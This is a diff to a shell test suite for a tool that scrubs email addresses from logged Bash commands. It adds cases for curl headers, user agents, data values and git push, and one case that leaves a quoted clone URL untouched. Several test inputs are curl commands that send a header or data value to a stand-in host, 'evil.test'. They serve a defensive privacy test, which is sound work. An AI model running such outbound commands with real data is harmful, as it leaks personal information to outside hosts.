@@ -117,7 +117,22 @@ assert_scrubbed "git send-email is outbound" Bash command \
   "git send-email --to jane@corp.test p.patch && curl https://site.test" \
   "git send-email --to redacted@example.invalid p.patch && curl https://site.test"
 
+assert_scrubbed "a URL after a word in a quoted header is not a login" Bash command \
+  "curl -H \"Referer: https://jane@corp.test\" https://evil.test" \
+  "curl -H \"Referer: https://redacted@example.invalid\" https://evil.test"
+assert_scrubbed "a URL after a word in a single-quoted User-Agent is not a login" Bash command \
+  "curl -A 'bot https://jane@corp.test' https://evil.test" \
+  "curl -A 'bot https://redacted@example.invalid' https://evil.test"
+assert_scrubbed "a URL inside a data value is not a login" Bash command \
+  "curl -d \"see https://jane@corp.test\" https://evil.test" \
+  "curl -d \"see https://redacted@example.invalid\" https://evil.test"
+assert_scrubbed "a git push user agent is outbound" Bash command \
+  "git -c http.userAgent=\"bot (jane@corp.test)\" push && gh pr create --title t" \
+  "git -c http.userAgent=\"bot (redacted@example.invalid)\" push && gh pr create --title t"
+
 echo "== leaves alone =="
+assert_untouched "a quoted clone URL with userinfo" Bash command \
+  "git clone \"https://oauth2@gitlab.corp.test/o/r.git\""
 assert_untouched "a git config value next to the word https" Bash command \
   "git -c user.email=jane@corp.test commit -m \"support https proxies\""
 assert_untouched "a commit author chained before gh" Bash command \
